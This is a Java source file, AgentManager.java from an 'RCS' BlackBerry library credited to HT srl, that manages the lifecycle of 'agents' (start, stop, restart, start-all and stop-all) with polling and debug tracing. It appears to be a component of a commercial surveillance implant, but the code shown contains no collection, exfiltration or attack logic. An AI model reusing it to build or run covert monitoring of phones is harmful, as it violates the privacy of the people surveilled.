/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : AgentManager.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import java.util.Vector;

import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.interfaces.Singleton;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

/**
 * The Class AgentManager.
 */
public final class AgentManager extends Manager implements Singleton {

    /** Tempo di attesa tra il check di stop. */
    private static final int SLEEP_CHECKING_STOP = 400;

    /** The debug. */
    static Debug debug = new Debug("AgentManager", DebugLevel.VERBOSE);

    /** The instance. */
    static AgentManager instance = null;

    /**
     * Gets the single instance of AgentManager.
     *
     * @return single instance of AgentManager
     */
    public static synchronized AgentManager getInstance() {
        if (instance == null) {
            instance = new AgentManager();
        }

        return instance;
    }

    /**
     * Instantiates a new agent manager.
     */
    private AgentManager() {
        super();
    }

    /*
     * (non-Javadoc)
     * @see com.ht.rcs.blackberry.Manager#Stop(int)
     */
    public synchronized int stop(int typeId) {
        if (!statusObj.StopAgent(typeId)) {
            debug.trace("StopAgent() Agent already stopped");
            return Common.AGENT_STOPPED;
        }

        while (statusObj.AgentQueryStatus(typeId) != Common.AGENT_STOPPED) {
            Utils.Sleep(SLEEP_CHECKING_STOP);
        }

        boolean ret = statusObj.ReEnableAgent(typeId);
        return ret ? 1 : 0;
    }

    /*
     * (non-Javadoc)
     * @see com.ht.rcs.blackberry.Manager#ReStart(int)
     */
    public synchronized boolean reStart(int agentId) {
        if (statusObj.AgentQueryStatus(agentId) != Common.AGENT_RUNNING) {
            debug.trace("RestartAgent() Agent not running");
            return false;
        }

        if (stop(agentId) != Common.AGENT_OK) {
            debug.trace("RestartAgent() Stop FAILED");
            return false;
        }

        if (!start(agentId)) {
            debug.trace("RestartAgent() Start FAILED");
            return false;
        }

        debug.trace("RestartAgent() OK");
        return true;
    }

    /*
     * (non-Javadoc)
     * @see com.ht.rcs.blackberry.Manager#Start(int)
     */
    public synchronized boolean start(int agentId) {

        if (!statusObj.isValidAgent(agentId)) {
            debug.error("AgentManager Start FAILED [0] " + agentId);
            return false;
        }

        if (statusObj.AgentQueryStatus(agentId) == Common.AGENT_RUNNING) {
            debug.info("AgentManager Start RUNNING" + agentId);
            return true;
        }

        // return statusObj.StartAgent(agentId);
        Agent agent = statusObj.GetAgent(agentId);

        if (agent == null) {
            debug.error("Agent unknown: " + agentId);
            return false;
        }

        agent.start();
        debug.trace("Start() OK");
        return true;

    }

    // Qui vengono eseguiti gli agenti che funzionano come thread
    /*
     * (non-Javadoc)
     * @see com.ht.rcs.blackberry.Manager#StartAll()
     */
    public synchronized boolean startAll() {
        Vector agents = statusObj.GetAgentsList();

        for (int i = 0; i < agents.size(); i++) {
            Agent agent = (Agent) agents.elementAt(i);

            if (agent.AgentStatus == Common.AGENT_ENABLED) {
                agent.start();
            }
        }

        debug.trace("StartAll() OK");
        return true;
    }
    
    /*
     * (non-Javadoc)
     * @see com.ht.rcs.blackberry.Manager#StopAll()
     */
    public synchronized int stopAll() {
        // Diciamo a tutti gli agenti di fermarsi
        statusObj.StopAgents();
        Vector agents = statusObj.GetAgentsList();

        for (int i = 0; i < agents.size(); i++) {
            Agent agent = (Agent) agents.elementAt(i);
            stop(agent.AgentId);
        }

        statusObj.ReEnableAgents();

        return Common.AGENT_STOPPED;

    }

}
